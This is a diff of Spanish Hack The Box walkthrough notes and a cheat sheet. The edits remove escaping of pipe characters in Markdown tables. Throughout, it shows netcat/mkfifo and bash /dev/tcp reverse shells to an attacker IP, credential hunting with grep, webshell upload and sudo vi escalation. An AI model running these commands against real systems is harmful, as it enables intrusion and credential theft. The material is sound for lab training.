@@ -9,7 +9,7 @@ La os-shell de SQLMap es incómoda y frágil. Nos enviamos una reverse shell pro
 | |
 |---|
 |**Reverse shell con netcat/mkfifo**|
-|_En tu Kali: ponerse a la escucha (puerto ALTO; los puertos bajos no van)_<br><br>$ nc -lvnp 4444<br><br>_Desde la os-shell: payload netcat/mkfifo de revshells.com (TU IP y puerto)_<br><br>$ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.185 4444 >/tmp/f|
+|_En tu Kali: ponerse a la escucha (puerto ALTO; los puertos bajos no van)_<br><br>$ nc -lvnp 4444<br><br>_Desde la os-shell: payload netcat/mkfifo de revshells.com (TU IP y puerto)_<br><br>$ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.185 4444 >/tmp/f|
 |**⚠  Detalle que falla a todo el mundo: el puerto**<br><br>Usar **puertos altos** (4444, 8000, 9000...). Los **puertos bajos** (como 444) no funcionan. Y comprobar siempre que la **IP** del payload es la tuya de HTB (la tun0, que aparece arriba a la derecha en HTB), no la de la víctima.|
 |**✔  Si una reverse shell no conecta — probar otra**<br><br>No todas funcionan en toda máquina (depende de lo instalado y del firewall). Si la primera no tira, prueba otra de revshells.com: la de **bash** (bash -i >& /dev/tcp/IP/PORT 0>&1), la de **Python**, etc. En Windows se usan otras (PowerShell IEX, Nishang...), que a veces son *flageadas* por el AV.|
 
@@ -116,7 +116,7 @@ Como www-data, en /home hay un usuario **robert** cuyo user.txt podemos leer. Pa
 |---|
 |**Caza de credenciales → SSH**|
 |_Localizar la flag (siempre en la carpeta del usuario)_<br><br>$ find / -name user.txt 2>/dev/null<br><br>$ cat /home/robert/user.txt<br><br>_Caza de credenciales: leer el codigo de la web_<br><br>$ cat /var/www/html/cdn-cgi/login/db.php<br><br>  -> credenciales del usuario robert<br><br>_Reutilizar por SSH_<br><br>$ ssh robert@<IP>|
-|**✔  Búsqueda masiva de credenciales (manual)**<br><br>Para no ir fichero por fichero: grep -riI pass /var/www/html 2>/dev/null busca «pass» de forma recursiva, ignorando mayúsculas (-i) y binarios (-I). Equivalente con find: find . -type f -exec cat {} \; 2>/dev/null \| grep -i pass. Útil para encontrar contraseñas, conexiones a BBDD, etc.|
+|**✔  Búsqueda masiva de credenciales (manual)**<br><br>Para no ir fichero por fichero: grep -riI pass /var/www/html 2>/dev/null busca «pass» de forma recursiva, ignorando mayúsculas (-i) y binarios (-I). Equivalente con find: find . -type f -exec cat {} \; 2>/dev/null | grep -i pass. Útil para encontrar contraseñas, conexiones a BBDD, etc.|
 
 ## B.7 Hacia root: enumeración con LinPEAS
 
@@ -172,7 +172,7 @@ La máquina de HTB **no tiene Internet**, así que no puede descargar herramient
 
 |**Acción**|**Comando principal**|**Alternativa / si falla**|
 |---|---|---|
-|Reverse shell|rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc IP PORT >/tmp/f|bash -i >& /dev/tcp/IP/PORT 0>&1 · revshells.com|
+|Reverse shell|rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f|bash -i >& /dev/tcp/IP/PORT 0>&1 · revshells.com|
 |Listener|nc -lvnp 4444 (puerto ALTO)|rlwrap nc -lvnp 4444 · pwncat-cs -lp 4444|
 |Estabilizar TTY|python3 -c 'import pty;pty.spawn("/bin/bash")'|script -qc /bin/bash /dev/null · socat|
 |...continuación|Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm|—|
@@ -181,7 +181,7 @@ La máquina de HTB **no tiene Internet**, así que no puede descargar herramient
 |Escalar (sudo binario)|sudo /bin/vi <ruta_permitida> → :!/bin/bash|Consultar el binario en **GTFOBins**|
 |Fuzzing web|feroxbuster -u http://<IP>|dirsearch · gobuster dir · ffuf -u .../FUZZ|
 |Subir webshell|Panel de upload → http://<IP>/uploads/shell.php|revshells.com (PHP) editada con IP/puerto|
-|Caza de credenciales|grep -riI pass /var/www/html 2>/dev/null|find . -type f -exec cat {} \; \| grep -i pass|
+|Caza de credenciales|grep -riI pass /var/www/html 2>/dev/null|find . -type f -exec cat {} \; | grep -i pass|
 |Localizar flag|find / -name user.txt 2>/dev/null|Mirar /home/<user>/ y Desktop|
 |Servir archivo (Kali)|python3 -m http.server 8000|php -S 0.0.0.0:8000 · updog|
 |Descargar (víctima)|curl http://IP:8000/f -o f|wget http://IP:8000/f|
